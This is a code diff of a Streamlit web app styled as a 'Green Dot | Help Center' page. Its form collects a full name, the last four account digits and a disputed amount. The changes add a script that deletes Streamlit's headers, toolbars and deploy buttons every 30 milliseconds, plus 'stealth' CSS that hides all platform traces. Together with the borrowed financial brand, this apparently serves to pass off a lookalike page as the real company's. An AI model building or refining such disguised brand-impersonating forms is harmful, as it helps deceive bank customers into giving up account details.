@@ -23,52 +23,52 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR V1.2.4 (INTERVALO 30ms)
+# JS NUCLEAR V1.2.5 (LIMPIEZA DE CONTENEDORES ESPECÍFICOS)
 st.markdown("""<script>
     const nuclearClean = () => {
-        const selectors = [
+        const toHide = [
             'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
             '[data-testid="stAppToolbar"]', '[data-testid="stHeaderActionElements"]',
-            '.stElementToolbar', '[data-testid="stElementToolbar"]',
-            '.st-emotion-cache-140j12g', '.st-emotion-cache-gi0tri',
-            'button[title="View fullscreen"]', 'button[aria-label="Fullscreen"]',
+            '.stElementToolbar', '[data-testid="stElementToolbar"]', 
             '.section-anchor', 'a.section-anchor', 'svg.etxdrby1'
         ];
-        selectors.forEach(s => {
-            document.querySelectorAll(s).forEach(el => {
-                el.style.display = 'none';
-                el.remove();
-            });
+        toHide.forEach(s => {
+            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
+        });
+
+        // Forzar fondo negro en contenedores rebeldes
+        document.querySelectorAll('.st-emotion-cache-h5555q').forEach(el => {
+            el.style.backgroundColor = '#000000';
+            el.style.border = 'none';
+            el.style.boxShadow = 'none';
         });
     };
     setInterval(nuclearClean, 30);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH TOTAL V1.2.4
+# CSS STEALTH TOTAL V1.2.5
 st.markdown("""<style>
-    /* BLINDAJE DE COLOR GLOBAL */
-    html, body, [data-testid="stAppViewContainer"], .stApp,
-    .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r, 
-    .st-emotion-cache-140j12g, .st-emotion-cache-h5555q {
+    /* BLINDAJE NEGRO ABSOLUTO */
+    html, body, [data-testid="stAppViewContainer"], .stApp, 
+    .st-emotion-cache-h5555q, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
         background-color: #000000 !important;
         color: #FFFFFF !important;
     }
 
-    /* FORZAR COLOR EN CONTENEDORES DE MENSAJES/BLOQUES */
-    [data-testid="stMarkdownContainer"], .st-emotion-cache-h5555q, .st-emotion-cache-18ni7ap {
-        background-color: #000000 !important;
-        color: #FFFFFF !important;
+    /* ELIMINACIÓN DE BORDES Y SOMBRAS EN CONTENEDORES DINÁMICOS */
+    .st-emotion-cache-h5555q {
         border: none !important;
+        box-shadow: none !important;
+        padding: 0.75rem !important;
     }
 
+    [data-testid="stMarkdownContainer"] p { color: #FFFFFF !important; }
     * { color: #FFFFFF !important; }
 
-    /* OCULTAR ANCLAS Y ACTION ELEMENTS */
+    /* OCULTAR ELEMENTOS DE INTERFAZ */
     [data-testid="stHeaderActionElements"], .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3 {
         display: none !important;
         visibility: hidden !important;
-        opacity: 0 !important;
-        pointer-events: none !important;
     }
 
     @media (prefers-color-scheme: light) {
@@ -78,7 +78,7 @@ st.markdown("""<style>
         }
     }
 
-    header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
+    header, footer, .stDeployButton { display: none !important; }
     .block-container { max-width: 500px !important; padding-top: 1rem !important; }
 
     .stButton > button {
@@ -96,7 +96,7 @@ st.markdown("""<style>
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
 
-with st.form("claim_v1_2_4", clear_on_submit=True):
+with st.form("claim_v1_2_5", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
